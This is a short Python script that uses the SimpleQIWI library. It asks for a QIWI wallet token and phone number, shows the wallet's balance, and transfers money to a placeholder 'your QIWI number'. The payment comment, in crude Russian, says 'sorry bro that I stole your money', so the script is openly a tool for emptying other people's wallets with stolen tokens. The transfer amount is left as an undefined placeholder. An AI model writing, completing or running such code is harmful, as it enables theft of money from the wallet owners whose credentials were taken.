#!/usr/bin/env python3

from core.colors import *
from SimpleQIWI import *

def viv():
	try:
		tok = input(B+"[#]"+W+" Enter token: ")
		pho = input(B+"[#]"+W+" Enter phone: ")
		api = QApi(token=tok, phone=pho)
		print(G+"[+]"+W+" Balance Founded")
		print(api.balance)
		api.pay(account="ваш номер киви", amount=сумма, comment='сорри бро что спиздил твои бабки')
		print(api.balance)
		input()
	except OSError:
		print(R+"[-]"+W+" Something wrong!")
		pass